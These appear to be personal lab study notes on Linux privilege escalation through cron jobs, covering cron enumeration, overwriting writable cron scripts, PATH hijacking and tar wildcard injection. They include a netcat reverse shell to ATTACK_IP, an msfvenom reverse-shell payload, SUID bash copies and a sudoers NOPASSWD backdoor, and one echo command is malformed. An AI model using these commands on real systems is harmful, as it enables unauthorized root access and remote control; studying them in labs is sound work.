# Cron job

## Finding Cron jobs

1. cat /etc/crontab
2. cat /etc/cron*
3. ls -lah /etc/cron*
4. `sudo crontab -l` to know current users cronjobs
5. `grep "CRON" /var/log/syslog`
6. cat /etc/cron.d
7. cat /var/spool/cron/crontabs/root
8. find weird file in /opt or maybe /tmp and check timestamp of file
9. check `ls -la` on suspicious file and check their timing
10. use pspy tool

***

## Exploit with cron job

### weak file permission

* if it has write permission then write nc into it or any other reverse shell command
* start listening from our machine
* echo > 'nc ATTACK\_IP 4444 -e /bin/sh' > /path/to/cronjob/file

![[image 2 1.png]]


![[Pasted image 20240512040122.png]]

always give `+sx` to file
```
./bash -p
```


> [!NOTE]
> * check group permission also because it happens that we are part of that group


### Path variable overtake

* check path in /etc/crontab
* create new file with written path with same name of cronjob file

![[Pasted image 20240510225707.png]]

> [!NOTE]
> * start nc listener and put reverse shell in that new file
> * other way is,
> * cp /bin/bash /tmp/bash
> * chmod +s /tmp/bash
> * also give +x permission to newly created file
> * /tmp/bash -p

![[image 3 1.png]]


#### This method is applicable only when full path were not given like `overwrite.sh`
![[Pasted image 20240510225836.png]]

### Insecure coding practice

* infinite way as it's not always promised



* here, \* is covered
* create payload and transfer
* Create these two files in /home/user

![[Pasted image 20240510230032.png]]

`touch /home/user/--checkpoint=1`

`touch /home/user/--checkpoint-action=exec=shell.elf`

#### academy way
```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

echo "" > "--checkpoint-action=exec=sh root.sh"

echo "" > --checkpoint=1
```


> [!NOTE]
> * msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
> * chmod +x /home/user/shell.elf
> 

![[image 4 1.png]]
